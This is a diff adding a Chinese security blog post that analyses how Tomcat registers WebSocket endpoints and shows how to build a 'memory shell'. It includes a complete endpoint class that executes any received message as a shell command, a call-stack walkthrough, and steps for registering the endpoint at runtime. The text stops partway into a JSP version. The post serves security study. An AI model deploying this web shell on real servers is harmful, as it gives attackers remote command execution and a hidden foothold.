@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="utf-8">
+
+    
+
+    <!-- 渲染优化 -->
+    <meta name="renderer" content="webkit">
+    <meta name="force-rendering" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="HandheldFriendly" content="True" >
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <!--icon-->
+
+    
+    
+    
+    
+    
+
+
+    <!-- meta -->
+
+
+<title>Java内存马-WebSocket内存马分析与实现 | Wileysec&#39;s Blog</title>
+
+
+    <meta name="keywords" content="Java安全, 内存马, WebSocket内存马">
+
+
+
+
+    <!-- OpenGraph -->
+ 
+    <meta name="description" content="WebSocket介绍   WebSocket是一种在Web应用程序中实现全双工通信的协议。它提供了一种持久的连接，允许服务器和客户端之间进行双向通信，而无需通过传统的HTTP请求-响应模型来发起通信  传统的Web应用程序通常使用HTTP协议进行通信，它是一种无状态的协议，每次请求都需要在客户端和服务器之间进行完整的连接和关闭，这种请求-响应模型的限制使得在实时通信和推送数据方面存在困难 Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java内存马-WebSocket内存马分析与实现">
+<meta property="og:url" content="https://wileysec.github.io/fee784a451d7.html">
+<meta property="og:site_name" content="Wileysec&#39;s Blog">
+<meta property="og:description" content="WebSocket介绍   WebSocket是一种在Web应用程序中实现全双工通信的协议。它提供了一种持久的连接，允许服务器和客户端之间进行双向通信，而无需通过传统的HTTP请求-响应模型来发起通信  传统的Web应用程序通常使用HTTP协议进行通信，它是一种无状态的协议，每次请求都需要在客户端和服务器之间进行完整的连接和关闭，这种请求-响应模型的限制使得在实时通信和推送数据方面存在困难 Web">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wileysec.github.io/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925100121781.png">
+<meta property="og:image" content="https://wileysec.github.io/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925100240748.png">
+<meta property="og:image" content="https://wileysec.github.io/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925103449812.png">
+<meta property="og:image" content="https://wileysec.github.io/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925105533115.png">
+<meta property="og:image" content="https://wileysec.github.io/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925110151551.png">
+<meta property="og:image" content="https://wileysec.github.io/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925110521615.png">
+<meta property="og:image" content="https://wileysec.github.io/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925110646583.png">
+<meta property="og:image" content="https://wileysec.github.io/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925110847021.png">
+<meta property="og:image" content="https://wileysec.github.io/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925130218457.png">
+<meta property="og:image" content="https://wileysec.github.io/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925130318290.png">
+<meta property="og:image" content="https://wileysec.github.io/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925130442587.png">
+<meta property="article:published_time" content="2023-09-20T09:21:38.934Z">
+<meta property="article:modified_time" content="2023-09-25T05:06:49.931Z">
+<meta property="article:author" content="wileysec">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="内存马">
+<meta property="article:tag" content="WebSocket内存马">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wileysec.github.io/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925100121781.png">
+
+
+    
+<link rel="stylesheet" href="/css/style/main.css">
+ 
+
+    
+    
+    
+    
+        <link rel="stylesheet" id="hl-default-theme" href="https://cdn.jsdelivr.net/npm/prismjs@1.21.0/themes/prism-tomorrow.min.css" media="none" >
+        
+    
+    
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/line-numbers/prism-line-numbers.min.css" media="none" onload="this.media='all'">
+    
+
+
+    
+    
+<link rel="stylesheet" href="/css/style/dark.css">
+
+    
+<script src="/js/darkmode.js"></script>
+
+
+
+     
+
+    <!-- custom head -->
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <body>
+        <div id="app" tabindex="-1">
+            <header class="header">
+    <div class="header__left">
+        <a href="/" class="button">
+            <span class="logo__text">Wiley&#39;s Blog</span>
+        </a>
+    </div>
+    <div class="header__right">
+        
+            <div class="navbar__menus">
+                
+                    <a href="/" class="navbar-menu button">首页</a>
+                
+                    <a href="/tags/" class="navbar-menu button">标签</a>
+                
+                    <a href="/archives/" class="navbar-menu button">归档</a>
+                
+                    <a href="/links/" class="navbar-menu button">链接</a>
+                
+                    <a href="/about/" class="navbar-menu button">关于我</a>
+                
+            </div>
+        
+        
+        
+    <a href="/search/" id="btn-search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="24" height="24" fill="currentColor" stroke="currentColor" stroke-width="32"><path d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z"></path></svg>
+    </a>
+
+
+        
+        
+    <a href="javaScript:void(0);" id="btn-toggle-dark">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+    </a>
+
+
+        
+            <a class="dropdown-icon button" id="btn-dropdown" tabindex="0"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width='24' height='24' fill="none" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" stroke-linejoin="round"><path fill="currentColor" d="M3.314,4.8h13.372c0.41,0,0.743-0.333,0.743-0.743c0-0.41-0.333-0.743-0.743-0.743H3.314c-0.41,0-0.743,0.333-0.743,0.743C2.571,4.467,2.904,4.8,3.314,4.8z M16.686,15.2H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,15.2,16.686,15.2z M16.686,9.257H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,9.257,16.686,9.257z"></path></svg></a>
+            <div class="dropdown-menus" id="dropdown-menus">
+                
+                    <a href="/" class="dropdown-menu button">首页</a>
+                
+                    <a href="/tags/" class="dropdown-menu button">标签</a>
+                
+                    <a href="/archives/" class="dropdown-menu button">归档</a>
+                
+                    <a href="/links/" class="dropdown-menu button">链接</a>
+                
+                    <a href="/about/" class="dropdown-menu button">关于我</a>
+                
+            </div>
+        
+    </div>
+</header>
+
+
+            <main class="main">
+    
+
+<div class="post-title">
+    <h1 class="post-title__text">
+        Java内存马-WebSocket内存马分析与实现
+    </h1>
+    <div class="post-title__meta">
+        <a href="/archives/2023/09/" class="post-meta__date button">文章创建于 2023-09-20</a>
+        
+    <span class="separate-dot"></span><a href="/categories/Java%E5%AE%89%E5%85%A8/" class="button">Java安全</a>
+
+ 
+        
+    
+    
+
+
+ 
+
+ 
+    </div>
+</div>
+
+
+    <aside class="post-side">
+        <div class="post-side__toc">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WebSocket%E4%BB%8B%E7%BB%8D"><span class="toc-text">WebSocket介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebSocket%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">WebSocket内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ServerEndpoint%E6%B3%A8%E8%A7%A3%E5%AE%9E%E7%8E%B0"><span class="toc-text">@ServerEndpoint注解实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%AE%9E%E7%8E%B0"><span class="toc-text">继承抽象类实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88%E5%88%86%E6%9E%90"><span class="toc-text">调用栈分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%AE%9E%E7%8E%B0WebSocket%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-text">动态实现WebSocket服务端</span></a></li></ol></li></ol></li></ol>
+        </div>
+    </aside>
+    <a class="btn-toc button" id="btn-toc" tabindex="0">
+        <svg viewBox="0 0 1024 1024" width="32" height="32" xmlns="http://www.w3.org/2000/svg">
+            <path d="M128 256h64V192H128zM320 256h576V192H320zM128 544h64v-64H128zM320 544h576v-64H320zM128 832h64v-64H128zM320 832h576v-64H320z" fill="currentColor"></path>
+        </svg>
+    </a>
+    <div class="toc-menus" id="toc-menus">
+        <div class="toc-title">Article Directory</div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WebSocket%E4%BB%8B%E7%BB%8D"><span class="toc-text">WebSocket介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebSocket%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">WebSocket内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ServerEndpoint%E6%B3%A8%E8%A7%A3%E5%AE%9E%E7%8E%B0"><span class="toc-text">@ServerEndpoint注解实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%AE%9E%E7%8E%B0"><span class="toc-text">继承抽象类实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88%E5%88%86%E6%9E%90"><span class="toc-text">调用栈分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%AE%9E%E7%8E%B0WebSocket%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-text">动态实现WebSocket服务端</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+
+<article class="post post__with-toc content-card">
+    <div class="post__header"></div>
+    <div class="post__content">
+        <h2 id="WebSocket介绍"><a href="#WebSocket介绍" class="headerlink" title="WebSocket介绍"></a>WebSocket介绍</h2><blockquote>
+<p>  WebSocket是一种在Web应用程序中实现全双工通信的协议。它提供了一种持久的连接，允许服务器和客户端之间进行双向通信，而无需通过传统的HTTP请求-响应模型来发起通信</p>
+</blockquote>
+<p>传统的Web应用程序通常使用HTTP协议进行通信，它是一种无状态的协议，每次请求都需要在客户端和服务器之间进行完整的连接和关闭，这种请求-响应模型的限制使得在实时通信和推送数据方面存在困难</p>
+<p>WebSocket的出现解决了这个问题，它通过在客户端和服务器之间建立一条持久的连接，可以实现实时通信和双向数据传输，与传统的HTTP请求不同，WebSocket连接在建立后会保持打开状态，允许服务器主动向客户端发送数据，而不需要等待客户端的请求</p>
+<p>WebSocket协议具有以下特点：</p>
+<ol>
+<li><p>双向通信：WebSocket允许服务器和客户端之间进行双向通信，可以在任何一方发送消息，而不仅仅是客户端向服务器发送请求</p>
+</li>
+<li><p>实时性：由于WebSocket连接是持久的，服务器可以实时向客户端推送数据，而不需要客户端发起请求。这使得实现实时聊天、实时数据更新和即时通知等功能变得更加容易</p>
+</li>
+<li><p>低延迟：WebSocket通过使用更有效的二进制消息格式，以及减少了HTTP的开销，可以实现较低的延迟和更高的性能</p>
+</li>
+<li><p>跨域支持：WebSocket支持跨域通信，允许在不同域之间进行实时通信</p>
+</li>
+<li><p>简化的API：WebSocket提供了一组简单易用的API，使得开发人员可以方便地创建和管理WebSocket连接，发送和接收消息</p>
+</li>
+</ol>
+<h2 id="WebSocket内存马"><a href="#WebSocket内存马" class="headerlink" title="WebSocket内存马"></a>WebSocket内存马</h2><p>Tomcat的WebSocket（WebSocket）是一种在单个TCP连接上进行全双工通信的协议。它允许客户端和服务器在单个TCP连接上交换数据。WebSocket是一种在单个TCP连接上进行全双工通信的协议，这使得它比HTTP更轻量级，并且可以在不关闭连接的情况下发送和接收数据</p>
+<p>在Tomcat中，想要实现WebSocket服务端一种办法是继承 <code>Endpoint</code> 抽象类，另一种办法就是直接使用注解 <code>@ServerEndpoint</code>，客户端使用注解 <code>@ClientEndpoint</code>（本文不会使用到客户端）</p>
+<h3 id="ServerEndpoint注解实现"><a href="#ServerEndpoint注解实现" class="headerlink" title="@ServerEndpoint注解实现"></a>@ServerEndpoint注解实现</h3><p><code>@ServerEndpoint</code> 注解作为服务端端点，指定一个URL路径让客户端进行连接，<code>Endpoint</code> 和Tomcat一样有生命周期的，其方法如下：</p>
+<ul>
+<li><p><code>onOpen</code> 开启一个新会话时调用，客户端和服务端握手连接时调用，对应 <code>@OnOpen</code> 注解</p>
+</li>
+<li><p><code>onMessage</code> 接收到客户端发送的消息时调用，对应 <code>@OnMessage</code> 注解</p>
+</li>
+<li><p><code>onError</code> 出现异常时调用，对应 <code>@OnError</code> 注解</p>
+</li>
+<li><p><code>onClose</code> 会话关闭时调用，对应 <code>@OnClose</code> 注解</p>
+</li>
+</ul>
+<p><code>@ServerEndpoint</code> 注解可以使用一些属性来配置WebSocket端点的行为和特性</p>
+<ul>
+<li><code>value</code> 指定WebSocket端点的访问路径，例如：<code>@ServerEndpoint(&quot;/ws&quot;)</code></li>
+<li><code>decoders</code> 指定用于解码接收到的消息的解码器类，可以指定多个解码器，使用数组形式，例如：<code>@ServerEndpoint(value = &quot;/ws&quot;, decoders = &#123;MyDecoder.class&#125;)</code></li>
+<li><code>encoders</code> 指定用于编码发送给客户端的消息的编码器类，可以指定多个编码器，使用数组形式，例如：<code>@ServerEndpoint(value = &quot;/ws&quot;, encoders = &#123;MyEncoder.class&#125;)</code></li>
+<li><code>configurator</code> 指定一个自定义的 <code>ServerEndpointConfig.Configurator</code> 类，用于配置WebSocket端点的配置，例如：<code>@ServerEndpoint(value = &quot;/ws&quot;, configurator = MyConfigurator.class)</code></li>
+<li><code>subprotocols</code> 属性用于指定支持的子协议（subprotocols），子协议是指在WebSocket连接建立时，客户端和服务器之间进行的协议交换，以确定在连接期间使用的协议</li>
+</ul>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>websocket<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>websocket<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ServerEndpoint</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span>
+
+<span class="token annotation punctuation">@ServerEndpoint</span><span class="token punctuation">(</span><span class="token string">"/ws"</span><span class="token punctuation">)</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WebSocketDemo</span> <span class="token punctuation">&#123;</span>
+    <span class="token annotation punctuation">@OnMessage</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onMessage</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">,</span><span class="token class-name">Session</span> session<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+            <span class="token class-name">Process</span> process<span class="token punctuation">;</span>
+            <span class="token keyword">boolean</span> bool <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"Windows"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>bool<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                process <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span><span class="token string">"/c"</span><span class="token punctuation">,</span>str<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+                process <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span>str<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> process<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">StringBuilder</span> stringBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">int</span> i<span class="token punctuation">;</span>
+            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">=</span> inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+                stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            inputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            process<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            session<span class="token punctuation">.</span><span class="token function">getBasicRemote</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sendText</span><span class="token punctuation">(</span>stringBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> exception<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            exception<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token annotation punctuation">@OnOpen</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onOpen</span><span class="token punctuation">(</span><span class="token class-name">Session</span> session<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+    <span class="token annotation punctuation">@OnError</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onError</span><span class="token punctuation">(</span><span class="token class-name">Throwable</span> error<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        error<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="继承抽象类实现"><a href="#继承抽象类实现" class="headerlink" title="继承抽象类实现"></a>继承抽象类实现</h3><p>使用注解来实现WebSocket是比较简单的，因为注解可以自动化完成配置。如果我们想要使用继承抽象类来实现的话，就没有那么简单了</p>
+<p>在Tomcat中 <code>org.apache.tomcat.websocket.server.WsSci</code> 类用来加载WebSocket服务，Tomcat WebSocket使用了SCI机制，什么是SCI机制呢？</p>
+<p>SCI（Server Configuration Interface）是一种服务器配置接口，用于在服务器启动时动态配置WebSocket应用程序。SCI机制允许服务器在运行时动态配置WebSocket应用程序，例如添加和删除端点（endpoint）、设置消息过滤器等。这有助于提高WebSocket应用程序的灵活性和可扩展性</p>
+<p>Tomcat WebSocket使用了SCI机制来实现服务端动态配置，当服务器启动时，它将加载 <code>WEB-INF/web.xml</code> 文件中的配置，这些配置包括端点（endpoint）、消息过滤器等。然后，将这些配置应用到 <code>WebSocketContainer</code> 对象中，从而实现动态配置</p>
+<h4 id="调用栈分析"><a href="#调用栈分析" class="headerlink" title="调用栈分析"></a>调用栈分析</h4><p>当Tomcat启动时，会自动调用 <code>WsSci</code> 类的 <code>onStartUp</code> 方法，该类实现了 <code>ServletContainerInitializer</code> 接口，重写了 <code>onStartUp</code> 方法，那么我们就从这个方法打个断点分析一下</p>
+<pre class="line-numbers language-none"><code class="language-none">onStartup:49, WsSci (org.apache.tomcat.websocket.server)
+startInternal:5219, StandardContext (org.apache.catalina.core)
+start:183, LifecycleBase (org.apache.catalina.util)
+addChildInternal:726, ContainerBase (org.apache.catalina.core)
+addChild:698, ContainerBase (org.apache.catalina.core)
+addChild:696, StandardHost (org.apache.catalina.core)
+manageApp:1783, HostConfig (org.apache.catalina.startup)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:62, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:498, Method (java.lang.reflect)
+invoke:293, BaseModelMBean (org.apache.tomcat.util.modeler)
+invoke:819, DefaultMBeanServerInterceptor (com.sun.jmx.interceptor)
+invoke:801, JmxMBeanServer (com.sun.jmx.mbeanserver)
+createStandardContext:460, MBeanFactory (org.apache.catalina.mbeans)
+createStandardContext:408, MBeanFactory (org.apache.catalina.mbeans)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:62, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:498, Method (java.lang.reflect)
+invoke:293, BaseModelMBean (org.apache.tomcat.util.modeler)
+invoke:819, DefaultMBeanServerInterceptor (com.sun.jmx.interceptor)
+invoke:801, JmxMBeanServer (com.sun.jmx.mbeanserver)
+invoke:468, MBeanServerAccessController (com.sun.jmx.remote.security)
+doOperation:1468, RMIConnectionImpl (javax.management.remote.rmi)
+access$300:76, RMIConnectionImpl (javax.management.remote.rmi)
+run:1309, RMIConnectionImpl$PrivilegedOperation (javax.management.remote.rmi)
+doPrivileged:-1, AccessController (java.security)
+doPrivilegedOperation:1408, RMIConnectionImpl (javax.management.remote.rmi)
+invoke:829, RMIConnectionImpl (javax.management.remote.rmi)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:62, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:498, Method (java.lang.reflect)
+dispatch:357, UnicastServerRef (sun.rmi.server)
+run:200, Transport$1 (sun.rmi.transport)
+run:197, Transport$1 (sun.rmi.transport)
+doPrivileged:-1, AccessController (java.security)
+serviceCall:196, Transport (sun.rmi.transport)
+handleMessages:573, TCPTransport (sun.rmi.transport.tcp)
+run0:834, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
+lambda$run$0:688, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
+run:-1, 614595529 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$28)
+doPrivileged:-1, AccessController (java.security)
+run:687, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
+runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
+run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
+run:750, Thread (java.lang)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925100121781.png" alt="image-20230925100121781"></p>
+<p>在 <code>onStartUp</code> 方法中，调用了 <code>init</code> 方法，跟进该方法看一下</p>
+<p><img src="/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925100240748.png" alt="image-20230925100240748"></p>
+<p>可以看到，实例化了 <code>WsServerContainer</code> 类，并将属性名 <code>javax.websocket.server.ServerContainer</code> 和 <code>WsServerContainer</code> 对象添加到ServletContext上下文中，并返回了 <code>WsServerContainer </code> 对象</p>
+<p><img src="/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925103449812.png" alt="image-20230925103449812"></p>
+<p>接着在 <code>onStartup</code> 方法中对每个WebSocket端点应用程序类进行判断，如果该类使用了 <code>ServerEndpoint</code> 注解则添加到 <code>scannedPojoEndpoints</code> 集合中，其中就有我们写的恶意WebSocket端点</p>
+<p><img src="/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925105533115.png" alt="image-20230925105533115"></p>
+<p>创建了两个集合，用于WebSocket端点配置和扫描结果的过滤操作，由于 <code>serverApplicationConfigs</code> 集合是空的，则将 <code>scannedPojoEndpoints</code> 集合所有元素添加到 <code>filteredPojoEndpoints</code> 集合中，此时，我们写的恶意WebSocket端点应用程序类已经被添加到 <code>filteredPojoEndpoints</code> 集合中了</p>
+<p><img src="/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925110151551.png" alt="image-20230925110151551"></p>
+<p><img src="/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925110521615.png" alt="image-20230925110521615"></p>
+<p>在这里遍历 <code>filteredPojoEndpoints</code> 集合并调用 <code>sc.addEndpoint</code> 方法将恶意WebSocket端点应用程序类添加WebSocket端点，跟进这个方法看一下</p>
+<p><img src="/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925110646583.png" alt="image-20230925110646583"></p>
+<p>在这个方法中，定义了一个 <code>ServerEndpointConfig</code> 类对象，从注解中读取value属性值，也就是我们之前写的WebSocket访问路径</p>
+<p><img src="/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925110847021.png" alt="image-20230925110847021"></p>
+<p>不是重点内容，我们就不看了，直接看重点，先是对 <code>sec</code> 对象进行赋值，调用了 <code>ServerEndpointConfig.Builder.create(pojo, path)</code> 创建WebSocket端点配置对象，最后调用了 <code>addEndpoint</code> 方法</p>
+<p>根据上面的分析，我们大概知道如何把我们的注册恶意WebSocket端点了，有如下步骤：</p>
+<ol>
+<li>指定一个WebSocket访问路径</li>
+<li>获取ServletContext对象</li>
+<li>获取ServerEndpointConfig对象</li>
+<li>获取WsServerContainer对象，由于WsServerContainer对象实现了ServerContainer接口的 <code>addEndpoint</code> 方法，这里我们直接获取ServerContainer对象</li>
+<li>最后调用ServerContainer对象的 <code>addEndpoint</code> 方法，将ServerEndpointConfig对象添加到WebSocket端点</li>
+</ol>
+<h4 id="动态实现WebSocket服务端"><a href="#动态实现WebSocket服务端" class="headerlink" title="动态实现WebSocket服务端"></a>动态实现WebSocket服务端</h4><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page import&#x3D;&quot;javax.websocket.Endpoint&quot; %&gt;
+&lt;%@ page import&#x3D;&quot;javax.websocket.MessageHandler&quot; %&gt;
+&lt;%@ page import&#x3D;&quot;javax.websocket.Session&quot; %&gt;
+&lt;%@ page import&#x3D;&quot;javax.websocket.EndpointConfig&quot; %&gt;
+&lt;%@ page import&#x3D;&quot;java.io.InputStream&quot; %&gt;
+&lt;%@ page import&#x3D;&quot;javax.websocket.server.ServerEndpointConfig&quot; %&gt;
+&lt;%@ page import&#x3D;&quot;javax.websocket.server.ServerContainer&quot; %&gt;
